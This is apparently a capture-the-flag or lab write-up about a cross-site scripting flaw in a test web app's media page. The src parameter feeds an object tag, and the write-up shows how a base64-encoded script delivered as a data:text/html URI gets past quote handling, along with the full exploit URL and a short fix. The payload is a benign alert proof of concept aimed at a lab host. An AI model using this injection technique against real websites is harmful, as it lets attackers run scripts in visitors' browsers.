# Media

http://192.168.56.101/index.php?page=media&src=nsa

`src` argument inserted directly into `data` field of `object` tag

```html
<object data="http://192.168.56.101/images/nsa_prism.jpg"></object>
```

Injecting html normally won't work because quotation marks are handled properly

It is possible, however, to inject serialized html

```bash
$ echo '<script>alert("WHEE")</script>' | base64
PHNjcmlwdD5hbGVydCgiV0hFRSIpPC9zY3JpcHQ+Cg==
```

This produces a serialized version of the script to be run

Replacing special characters leaves us with `PHNjcmlwdD5hbGVydCgiV0hFRSIpPC9zY3JpcHQ%2BCg%3D%3D`

Setting a few more options to be run allows us to embed any html into the webpage like this

```html
http://192.168.56.101/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgiV0hFRSIpPC9zY3JpcHQ%2BCg%3D%3D
```

## Risk

User can execute arbitrary code on client machine

## Fix

Don't display exactly what the user gives you

Encode it or use a table of expected values

## Note

This is terribly set up.  It seems to be looking for exactly `<script>alert`

Sending `<script>print("WHEE")</script>` runs the javascript, but does not print the flag
